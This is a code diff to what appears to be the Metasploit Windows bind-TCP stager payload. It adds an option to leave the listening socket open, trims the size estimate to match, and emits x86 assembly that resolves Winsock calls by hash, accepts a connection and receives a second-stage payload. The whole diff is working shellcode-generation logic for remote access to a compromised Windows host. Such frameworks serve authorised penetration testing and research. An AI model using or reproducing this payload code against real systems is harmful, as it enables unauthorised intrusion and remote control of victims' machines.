@@ -20,21 +20,28 @@ module Payload::Windows::BindTcp
   include Msf::Payload::Windows::BlockApi
   include Msf::Payload::Windows::Exitfunk
 
+  def close_listen_socket
+    datastore['StagerCloseListenSocket'].nil? || datastore['StagerCloseListenSocket'] == true
+  end
+
   #
   # Generate the first stage
   #
-  def generate
+  def generate_bind_tcp_from_datastore
+
     # Generate the simple version of this stager if we don't have enough space
     if self.available_space.nil? || required_space > self.available_space
       return generate_bind_tcp(
-        port: datastore['LPORT']
+        port:         datastore['LPORT'],
+        close_socket: close_listen_socket
       )
     end
 
     conf = {
-      port: datastore['LPORT'],
-      exitfunk: datastore['EXITFUNC'],
-      reliable: true
+      port:         datastore['LPORT'],
+      exitfunk:     datastore['EXITFUNC'],
+      close_socket: close_listen_socket,
+      reliable:     true
     }
 
     generate_bind_tcp(conf)
@@ -70,6 +77,11 @@ module Payload::Windows::BindTcp
     # Reliability checks add 4 bytes for the first check, 5 per recv check (2)
     space += 14
 
+    # if the payload doesn't need the listen socket closed then we save space. This is
+    # the case for meterpreter payloads, as metsrv now closes the listen socker once it
+    # kicks off (needed for more reliable shells).
+    space -= 8 unless close_listen_socket
+
     # The final estimated size
     space
   end
@@ -84,6 +96,7 @@ module Payload::Windows::BindTcp
   def asm_bind_tcp(opts={})
 
     reliable     = opts[:reliable]
+    close_socket = opts[:close_socket]
     encoded_port = "0x%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
 
     asm = %Q^
@@ -153,12 +166,22 @@ module Payload::Windows::BindTcp
         push edi               ; listening socket
         push 0xE13BEC74        ; hash( "ws2_32.dll", "accept" )
         call ebp               ; accept( s, 0, 0 );
+      ^
 
-        push edi               ; push the listening socket to close
-        xchg edi, eax          ; replace the listening socket with the new connected socket for further comms
-        push 0x614D6E75        ; hash( "ws2_32.dll", "closesocket" )
-        call ebp               ; closesocket( s );
+      if close_socket
+        asm << %Q^
+          push edi               ; push the listening socket to close
+          xchg edi, eax          ; replace the listening socket with the new connected socket for further comms
+          push 0x614D6E75        ; hash( "ws2_32.dll", "closesocket" )
+          call ebp               ; closesocket( s );
+        ^
+      else
+        asm << %Q^
+          xchg edi, eax          ; replace the listening socket with the new connected socket for further comms
+        ^
+      end
 
+      asm << %Q^
       recv:
         ; Receive the size of the incoming second stage...
         push 0                 ; flags
